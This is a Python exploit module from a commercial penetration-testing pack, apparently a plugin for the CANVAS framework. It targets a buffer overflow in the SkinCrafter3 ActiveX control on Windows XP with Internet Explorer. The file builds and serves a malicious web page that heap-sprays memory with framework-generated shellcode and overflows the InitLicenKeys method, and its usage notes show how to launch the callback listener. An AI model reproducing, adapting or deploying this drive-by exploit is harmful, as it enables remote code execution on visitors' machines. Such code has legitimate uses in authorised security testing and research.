#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2015
#


import sys

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside

import struct

# GUI info
NAME = "SkinCrafter3 SkinCrafter3_vs2005.dll ActiveX Buffer Overflow Vulnerability"

DESCRIPTION = "Buffer overflow vulnerability in SkinCrafter3 SkinCrafter3_vs2005.dll ActiveX"

DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "SkinCrafter"
DOCUMENTATION["Date public"] = "2015.01.05"
DOCUMENTATION["VersionsAffected"] = "SkinCrafter3 3.8.1"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"] = "http://www.exploit-db.com/exploits/35694/"
DOCUMENTATION["CVE Name"] = "Unknown"
DOCUMENTATION["CVE Url"] = "Unknown"
DOCUMENTATION["Notes"] = ""

VERSION='1.0'

GTK2_DIALOG='dialog.glade2'

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [['Windows']]
PROPERTY['VERSION'] = ['XP']

NOTES="""
Usage:
.\commandlineInterface.py -p 443 -v 12
.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_skincrafter -l 192.168.133.1 -d 443 -p 80
"""

CHANGELOG="""
"""

targets = {    
    0:['Windows XP with IE'],
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.clientversion = 1
        self.badstring = "\x00"
        self.subesp = 0
        self.name = NAME 
        self.filename = "index.html"
        return

    def makefile(self):
        filedata = """
<HTML> 
<BODY>
 
<DIV id="targetDiv">

</DIV>

<SCRIPT language="javascript">  

try {
    var detect = new ActiveXObject("SkinCrafter.SCSkin3");
    
    if (detect) {		
    	document.getElementById("targetDiv").innerHTML = "<object classid='clsid:B9D38E99-5F6E-4C51-8CFD-507804387AE9' id='target'>";	
    		
    	var stackBuffer = "";
    	var heapSprayToAddress = 0x0c0c0c0c; 
    	var payLoadCode = unescape('SHELLCODE'); 
    	var heapBlockSize = 0x400000; 
    	var payLoadSize = payLoadCode.length * 2; 
    	var spraySlideSize = heapBlockSize - (payLoadSize+0x38); 
    	var spraySlide = unescape("%u0c0c%u0c0c"); 
    	spraySlide = getSpraySlide(spraySlide,spraySlideSize); 
    	heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize; 
    	memory = new Array(); 
    	
    	for (i=0;i<heapBlocks;i++) { 
    		memory[i] = spraySlide + payLoadCode; 
    	} 
    	
    	function getSpraySlide(spraySlide, spraySlideSize) {
    		while (spraySlide.length*2<spraySlideSize) { 
    			spraySlide += spraySlide; 
    		} 
    		
    		spraySlide = spraySlide.substring(0,spraySlideSize/2); 
    		return spraySlide; 
    	} 
        
    	for (i=0;i<15000;i++) {
            stackBuffer += unescape("%0c"); 
        }    
            
        target.InitLicenKeys("d2" ,"d2" ,stackBuffer ,"d2");
    }
}
catch(e) {}

</SCRIPT> 

</BODY> 
</HTML>        
"""
        filedata = filedata.replace('SHELLCODE', urluencode('AAAAAA' + self.shellcode))
		
        return filedata

    def makesploit(self, clientheader, clientbody):        
        from libs.spkproxy import header, body
        h = header('SERVER')
        b = body()
        
        if clientheader.URL.count(self.filename):
            self.createShellcode()
            sploitstring = self.makefile()            
            b.setBody(sploitstring)
        else:
            self.log('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'binary/octet-stream')
        return h, b

    def neededListenerTypes(self):
        from canvasengine import HTTPMOSDEF
        return [HTTPMOSDEF]
    
    def createShellcode(self):
        self.createWin32ClientSideShellcode()
        return self.shellcode

    def run(self):        
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
